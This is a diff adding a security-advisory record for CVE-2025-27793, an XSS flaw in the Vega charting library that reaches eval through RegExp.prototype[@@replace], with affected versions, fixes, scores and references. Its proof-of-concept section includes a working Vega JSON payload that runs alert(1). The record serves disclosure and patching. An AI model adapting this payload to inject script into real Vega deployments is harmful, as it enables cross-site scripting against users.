@@ -1,0 +1,76 @@
+advisory_id: GHSA-963h-3v39-3pqf
+datasource_id: github_osv_importer_v2/GHSA-963h-3v39-3pqf
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-963h-3v39-3pqf/GHSA-963h-3v39-3pqf.json
+aliases:
+  - CVE-2025-27793
+summary: |
+  Vega vulnerable to Cross-site Scripting via RegExp.prototype[@@replace]
+  ## Impact
+
+  Users running Vega/Vega-lite JSON definitions could run unexpected JavaScript code when drawing graphs, unless the library is used with the `vega-interpreter`.
+
+  ## Workarounds
+
+  - Use `vega` with [expression interpreter](https://vega.github.io/vega/usage/interpreter/)
+  - Upgrade to a [newer Vega version](https://github.com/vega/vega/releases/tag/v5.32.0) (`5.32.0`)
+
+  ### POC Summary
+
+  Calling `replace` with a `RegExp`-like pattern calls `RegExp.prototype[@@replace]`, which can then call an attacker-controlled `exec` function.
+
+  ### POC Details
+
+  Consider the function call `replace('foo', {__proto__: /h/.constructor.prototype, global: false})`. Since `pattern` has `RegExp.prototype[@@replace]`, `pattern.exec('foo')` winds up being called.
+
+  The resulting malicious call looks like this:
+  ```
+  replace(<string argument>, {__proto__: /h/.constructor.prototype, exec: <function>, global: false})
+  ```
+
+  Since functions cannot be returned from this, an attacker that wishes to escalate to XSS must abuse `event.view` to gain access to `eval`.
+
+  ### Reproduction steps
+
+  ```
+  {"$schema":"https://vega.github.io/schema/vega/v5.json","signals":[{"name":"a","on":[{"events":"body:mousemove{99999}","update":"replace('alert(1)',{__proto__:/h/.constructor.prototype,exec:event.view.eval,global:false})"}]}]}
+  ```
+impacted_packages:
+  - purl: pkg:npm/vega
+    affected_versions: vers:npm/<5.32.0
+    fixed_versions: vers:npm/5.32.0
+  - purl: pkg:npm/vega-functions
+    affected_versions: vers:npm/<5.17.0
+    fixed_versions: vers:npm/5.17.0
+severities:
+  - score: '5.3'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-963h-3v39-3pqf/GHSA-963h-3v39-3pqf.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-79
+  - CWE-87
+references:
+  - url: https://github.com/vega/vega
+    reference_type:
+    reference_id:
+  - url: https://github.com/vega/vega/commit/694560c0aa576df8b6c5f0f7d202ac82233e6966
+    reference_type:
+    reference_id:
+  - url: https://github.com/vega/vega/releases/tag/v5.32.0
+    reference_type:
+    reference_id:
+  - url: https://github.com/vega/vega/security/advisories/GHSA-963h-3v39-3pqf
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-27793
+    reference_type:
+    reference_id:
+  - url: https://vega.github.io/vega/usage/interpreter
+    reference_type:
+    reference_id:
